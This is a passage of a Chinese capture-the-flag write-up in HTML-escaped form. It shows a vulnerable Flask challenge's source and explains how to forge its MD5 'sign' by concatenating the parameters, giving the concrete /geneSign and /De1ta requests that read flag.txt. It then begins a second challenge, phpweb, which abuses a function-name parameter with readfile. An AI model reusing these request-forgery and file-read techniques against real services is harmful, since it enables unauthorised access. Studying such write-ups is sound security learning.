&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask &lt;span style="color:#f92672"&gt;import&lt;/span&gt; request
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; socket
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; hashlib
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; urllib
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; os
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; json
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;reload(sys)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;setdefaultencoding(&lt;span style="color:#e6db74"&gt;&amp;#39;latin1&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;app &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Flask(__name__)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;secert_key &lt;span style="color:#f92672"&gt;=&lt;/span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urandom(&lt;span style="color:#ae81ff"&gt;16&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Task&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self, action, param, sign, ip):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action &lt;span style="color:#f92672"&gt;=&lt;/span&gt; action
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;param &lt;span style="color:#f92672"&gt;=&lt;/span&gt; param
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sign &lt;span style="color:#f92672"&gt;=&lt;/span&gt; sign
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox &lt;span style="color:#f92672"&gt;=&lt;/span&gt; md5(ip)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;not&lt;/span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;path&lt;span style="color:#f92672"&gt;.&lt;/span&gt;exists(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox)): &lt;span style="color:#75715e"&gt;# SandBox For Remote_Addr&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;mkdir(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exec&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;500&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;checkSign()):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;scan&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tmpfile &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;./&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;/result.txt&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox, &lt;span style="color:#e6db74"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; resp &lt;span style="color:#f92672"&gt;=&lt;/span&gt; scan(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;param) &lt;span style="color:#75715e"&gt;# 此处是文件读取得注入点&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (resp &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Connection Timeout&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; resp
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print resp
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tmpfile&lt;span style="color:#f92672"&gt;.&lt;/span&gt;write(resp)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tmpfile&lt;span style="color:#f92672"&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;read&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; f &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;./&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;/result.txt&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox, &lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; f&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;500&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Action Error&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;500&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;msg&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Sign Error&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; result
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;checkSign&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (getSign(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action, self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;param) &lt;span style="color:#f92672"&gt;==&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sign):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# generate Sign For Action Scan.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/geneSign&amp;#34;&lt;/span&gt;, methods&lt;span style="color:#f92672"&gt;=&lt;/span&gt;[&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;geneSign&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; param &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;param&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; action &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;scan&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; getSign(action, param)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/De1ta&amp;#39;&lt;/span&gt;, methods&lt;span style="color:#f92672"&gt;=&lt;/span&gt;[&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;challenge&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; action &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;cookies&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;action&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; param &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;param&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sign &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;cookies&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;sign&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ip &lt;span style="color:#f92672"&gt;=&lt;/span&gt; request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;remote_addr
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (waf(param)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;No Hacker!!!!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; task &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Task(action, param, sign, ip)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; json&lt;span style="color:#f92672"&gt;.&lt;/span&gt;dumps(task&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Exec())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;index&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;code.txt&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;r&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;scan&lt;/span&gt;(param):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; socket&lt;span style="color:#f92672"&gt;.&lt;/span&gt;setdefaulttimeout(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlopen(param)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()[:&lt;span style="color:#ae81ff"&gt;50&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Connection Timeout&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;getSign&lt;/span&gt;(action, param):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; hashlib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;md5(secert_key &lt;span style="color:#f92672"&gt;+&lt;/span&gt; param &lt;span style="color:#f92672"&gt;+&lt;/span&gt; action)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hexdigest()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;(content):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; hashlib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;md5(content)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hexdigest()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;waf&lt;/span&gt;(param):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; check &lt;span style="color:#f92672"&gt;=&lt;/span&gt; param&lt;span style="color:#f92672"&gt;.&lt;/span&gt;strip()&lt;span style="color:#f92672"&gt;.&lt;/span&gt;lower()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; check&lt;span style="color:#f92672"&gt;.&lt;/span&gt;startswith(&lt;span style="color:#e6db74"&gt;&amp;#34;gopher&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;or&lt;/span&gt; check&lt;span style="color:#f92672"&gt;.&lt;/span&gt;startswith(&lt;span style="color:#e6db74"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; app&lt;span style="color:#f92672"&gt;.&lt;/span&gt;debug &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; app&lt;span style="color:#f92672"&gt;.&lt;/span&gt;run(host&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单说明思路：&lt;/p&gt;
&lt;p&gt;请求部分(代码69-78)：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;获取的param是需要打开文件的名称，提示中已经写出flag在flag.txt。根据使用函数，可以使用get传参&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;读取文件需要在cookie里传入参数action、sign&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;action是执行类型，代码33行和43行指出了两种。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sing是用来验证param和action的，相关函数在94行，稍后做解释&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;获取sign部分(61-66)&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;获取param，action固定为scan&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;返回(secert_key + param + action)组合的sign&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;所以我们需要先获取sign，获取sign时包含的param和action，再去请求文件获得flag，并且获取flag时会验证sign是否符合格式(代码32行、54-58行)。因为获取sign时action固定为scan(代码65)，但是请求中我们需要使用read才可以访问，所以构造payload。&lt;/p&gt;
&lt;p&gt;假如param=flag.txt，获取sign时action固定值为scan，此时的sign为(使用&lt;code&gt;|&lt;/code&gt;仅为说明使用，其实字符串是相连的)&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;secert_key|flag.txt|scan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是我们想要使用read，可以构造param为flag.txtread&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;secert_key|flag.txtread|scan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再进行验证的时候我们传入param为flag.txt，action为readscan即可符合格式。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;secert_key|flag.txt|readscan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;请求/geneSign&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/geneSign?param=flag.txtread
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;9017a8826b7267833f22c0f22d90fea7
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到sign以后，再去访问/De1ta&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/De1ta?param=flag.txt
sign=9017a8826b7267833f22c0f22d90fea7;action=readscan;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获得flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="网鼎杯-2020-朱雀组phpweb"&gt;[网鼎杯 2020 朱雀组]phpweb
&lt;/h1&gt;&lt;p&gt;看源码，有一个表单和自动提交的js。表单参数为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;func=date&amp;amp;p=Y-m-d+h%3Ai%3As+a
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;是一个获取时间的函数。尝试注入点func是函数，就试试常见的读取文件函数readfile可以读取index.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
